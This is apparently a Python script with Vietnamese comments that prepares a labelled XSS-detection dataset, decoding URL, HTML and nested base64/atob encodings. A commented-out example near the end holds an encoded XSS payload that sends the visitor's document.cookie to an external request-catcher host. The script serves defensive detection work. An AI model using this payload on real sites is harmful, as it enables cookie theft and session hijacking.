import pandas as pd
import base64
import html
import re
import urllib.parse
from urllib.parse import urlparse

# Hàm để parse và lấy phần path từ URL
def get_path_from_url(url):
    parsed_url = urlparse(url)
    return parsed_url.path

def parse_url(input_file, out_file):
    """
    Đọc URL từ file và ghi phần path vào file khác.
    """
    with open(input_file, 'r') as file:
        urls = file.readlines()

    with open(out_file, 'w') as file:
        for url in urls:
            url = url.strip()  # Loại bỏ khoảng trắng thừa
            path = get_path_from_url(url)
            file.write(path + '\n')  # Ghi path vào file

    print(f"Kết quả đã được ghi vào file {out_file}")

def read_raw_file(file_path):
    """
    Đọc dữ liệu từ tệp raw và trả về danh sách các dòng không rỗng.
    """
    with open(file_path, 'r', encoding='utf-8') as file:
        data = file.readlines()
    return [line.strip() for line in data if line.strip()]

def create_dataframe(data, label):
    """
    Tạo DataFrame cho dữ liệu và thêm nhãn.
    """
    df = pd.DataFrame({'Sentence': data})
    df['Label'] = label
    return df

def merge(fileA, fileB, output):
    """
    Kết hợp hai tệp dữ liệu và lưu vào một tệp CSV.
    """
    data_A = read_raw_file(fileA)
    data_B = read_raw_file(fileB)

    df_A = create_dataframe(data_A, 1)
    df_B = create_dataframe(data_B, 0)

    # Xử lý chuỗi trong cột 'Sentence' bằng cách decode
    df_A['Sentence'] = df_A['Sentence'].apply(decode_until_clear)
    df_B['Sentence'] = df_B['Sentence'].apply(decode_until_clear)

    # Thay thế "" thành " và loại bỏ dấu nháy kép thừa
    df_A['Sentence'] = df_A['Sentence'].apply(lambda x: x.replace('""', '"').replace('"', '').strip())
    df_B['Sentence'] = df_B['Sentence'].apply(lambda x: x.replace('""', '"').replace('"', '').strip())

    print("Đầu ra DataFrame A sau khi xử lý:")
    print(df_A['Sentence'].head())  # In ra 5 bản ghi đầu tiên của df_A

    print("Đầu ra DataFrame B sau khi xử lý:")
    print(df_B['Sentence'].head())  # In ra 5 bản ghi đầu tiên của df_B

    # Kết hợp cả hai DataFrame thành một DataFrame mới
    merged_df = pd.concat([df_A, df_B], ignore_index=True)

    # Lưu DataFrame mới vào tệp CSV
    merged_df.to_csv(output, index=False, sep=',', quoting=1)

    print(f"Dữ liệu đã được kết hợp và lưu vào {output}")

def shuf(filename, output):
    """
    Xáo trộn các dòng trong DataFrame và lưu vào một file CSV mới.
    """
    df = pd.read_csv(filename, sep=',')
    df_shuffled = df.sample(frac=1).reset_index(drop=True)

    df_shuffled.insert(0, 'No', range(0, len(df_shuffled)))
    df_shuffled.to_csv(output, index=False, sep=',')
    print(f"Dữ liệu đã được xáo trộn và lưu vào {output}")

def is_base64_encoded(data):
    """
    Kiểm tra xem chuỗi có phải là Base64 hay không.
    """
    try:
        base64.b64decode(data, validate=True)
        return True
    except Exception:
        return False

def clean_and_replace(sentence):
    """
    Thay thế các ký tự đặc biệt trong câu.
    """
    replacements = {
        '”': '"',
        '“': '"',
        '’': "'",
        '‘': "'",
        '–': '-'  # Thêm dấu gạch ngang nếu cần
    }

    for key, value in replacements.items():
        sentence = sentence.replace(key, value)
    
    cleaned_sentence = re.sub(r'[^\x20-\x7E]', '', sentence)
    
    return cleaned_sentence

def decode_until_clear(data):
    """
    Giải mã chuỗi cho đến khi không còn thay đổi.
    """
    previous_data = None
    while data != previous_data:
        previous_data = data
        # Decode URL
        data = urllib.parse.unquote(data)
        data = data.replace('\r', '').replace('\n', '')
        # Decode HTML
        data = html.unescape(data)
        data = clean_and_replace(data)
        data_lower = data.lower()
    return data_lower

def decode_file(input_file, output_file):
    """
    Giải mã từng dòng từ tệp và lưu kết quả vào tệp mới.
    """
    with open(input_file, 'r', encoding='utf-8') as infile, open(output_file, 'w', encoding='utf-8') as outfile:
        for line in infile:
            decoded_line = decode_until_clear(line.lstrip())
            outfile.write(decoded_line + '\n')

    print(f"Giải mã và lưu dữ liệu thành công vào file '{output_file}'.")

def extract_base64_from_atob(input_string):
    """
    Trích xuất chuỗi Base64 từ hàm atob.
    """
    pattern = r'atob\(\s*"([^"]+)"\s*\)|atob\(\s*\'([^\']+)\'\s*\)'
    matches = re.findall(pattern, input_string)
    
    base64_strings = [m[0] if m[0] else m[1] for m in matches]
    
    return base64_strings

def decode_base64_recursive(encoded_string):
    """
    Giải mã Base64 đệ quy.
    """
    try:
        decoded_bytes = base64.b64decode(encoded_string)
        decoded_string = decoded_bytes.decode('utf-8')
        
        if 'atob(' in decoded_string:
            inner_base64_strings = extract_base64_from_atob(decoded_string)
            for inner_base64_string in inner_base64_strings:
                decoded_string = decode_base64_recursive(inner_base64_string)
        
        return decoded_string
    except Exception:
        return encoded_string  # Trả về chuỗi gốc nếu không thể giải mã

def get_decoded_b64(input_string):
    """
    Giải mã chuỗi Base64 và in ra kết quả.
    """
    dec_string = decode_until_clear(input_string)
    base64_strings = extract_base64_from_atob(dec_string)
    
    if base64_strings:
        for base64_string in base64_strings:
            decoded_string = decode_base64_recursive(base64_string)
            print("Decoded string:", decoded_string)
    else:
        print("No Base64 encoded string found.")

# Ví dụ sử dụng
# input_string = 'title=cyberpunker&message=<button autofocus onfocus=write(atob(&quot;PHNjcmlwdD50b3AubG9jYXRpb249J2h0dHBzOi8vaHR0cHJlcS5jb20vb2RkLWxlYWYteWRlMWZ1N3AvcmVjb3JkP2NtZD0nK2RvY3VtZW50LmNvb2tpZTwvc2NyaXB0Pg==&quot;))>'
# get_decoded_b64(input_string)

# merge('XSSdata.txt', 'fileNormal.txt', 'output.csv')
# shuf('output.csv', 'shuffled_output.csv')

# decode_file(input_file='xssed.csv', output_file='xssed_dec.csv')
